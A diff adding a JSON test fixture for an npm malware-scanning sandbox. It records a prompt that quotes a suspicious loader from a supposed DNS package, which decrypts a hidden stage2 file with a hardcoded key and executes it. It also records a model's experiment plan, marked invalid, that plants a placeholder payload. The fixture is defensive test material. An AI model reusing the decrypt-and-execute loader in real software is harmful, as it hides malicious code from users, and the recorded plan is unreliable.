@@ -1,0 +1,54 @@
+{
+  "id": "040_hypothesis_854e9f1e",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n\n## Flag\n- file: lib/loader.js\n- lines: 1-10\n- why: SAFE_TEST_MODE constant set to true at top of file is suspicious — suggests a mode to hide or bypass behavior; no legitimate use for a DNS resolver.\n\n## Entry points\n- install: install-hook.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### lib/loader.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const crypto = require(\"crypto\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const _k1 = \"s4ndw0rm\";\n8: const _k2 = \"_k3y_\";\n9: const _k3 = \"2024\";\n10: const _k4 = \"_v3ry_s3cr3t\";\n11: const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;\n12: \n13: function loadStage2() {\n14:   const encryptedPath = path.join(__dirname, \"stage2.enc\");\n15: \n16:   try {\n17:     const raw = fs.readFileSync(encryptedPath, \"utf-8\").trim();\n18:     const parts = raw.split(\":\");\n19: \n20:     if (parts.length !== 3) return;\n21: \n22:     const iv = Buffer.from(parts[0], \"hex\");\n23:     const authTag = Buffer.from(parts[1], \"hex\");\n24:     const encrypted = parts[2];\n25: \n26:     const key = crypto.createHash(\"sha256\").update(KEY_MATERIAL).digest();\n27: \n28:     const decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv);\n29:     decipher.setAuthTag(authTag);\n30: \n31:     let decrypted = decipher.update(encrypted, \"hex\", \"utf8\");\n32:     decrypted += decipher.final(\"utf8\");\n33: \n34:     const Module = require(\"module\");\n35:     const m = new Module();\n36:     m._compile(decrypted, \"stage2.js\");\n37:   } catch (e) {\n38: \n39:   }\n40: }\n41: \n42: loadStage2();\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, install-hook.js, lib/loader.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-854e9f1e",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "DigitalOcean",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"setup\": [\n    {\n      \"mechanism\": \"patchFile\",\n      \"target\": \"lib/loader.js\",\n      \"patch\": [\n        {\n          \"old\": \"const SAFE_TEST_MODE = true;\",\n          \"new\": \"const SAFE_TEST_MODE = false;\"\n        }\n      ]\n    },\n    {\n      \"mechanism\": \"plantFiles\",\n      \"target\": \"/pkg/lib/stage2.enc\",\n      \"content\": \"4e6f6e6365:746167:encrypted_payload_here\"\n    }\n  ],\n  \"trigger\": {\n    \"type\": \"entrypoint\",\n    \"target\": \"lib/loader.js\"\n  }\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 986,
+        "completion_tokens": 150,
+        "prompt_tokens_details": {
+          "cached_tokens": 768
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "json_object",
+    "recordedStatus": "invalid_output",
+    "recordedTs": "2026-07-23T10:46:30.352Z",
+    "recordedLatencyMs": 40575
+  }
+}
